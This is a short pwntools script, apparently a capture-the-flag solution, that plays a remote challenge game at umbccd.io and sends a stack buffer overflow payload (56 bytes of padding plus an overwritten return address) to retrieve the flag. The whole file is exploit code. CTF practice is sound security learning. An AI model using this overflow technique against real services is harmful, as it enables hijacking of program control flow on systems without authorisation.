from pwn import *

ret = 0x00401256
offset = 56
payload = b"A" * offset + p64(ret)

r = remote('umbccd.io', 4100)
r.recvuntil('BOF it to start!')
r.sendline('B')
r.recvline() #empty line

while True:
    respond = r.recvlineS()
    if 'Shout' in respond:
        break
    else:
        r.sendline(respond[0])

r.sendline(payload)
r.recvline()
r.sendline('ERROR') # sending invalid input to break the while loop
flag = r.recvlineS()

print(flag)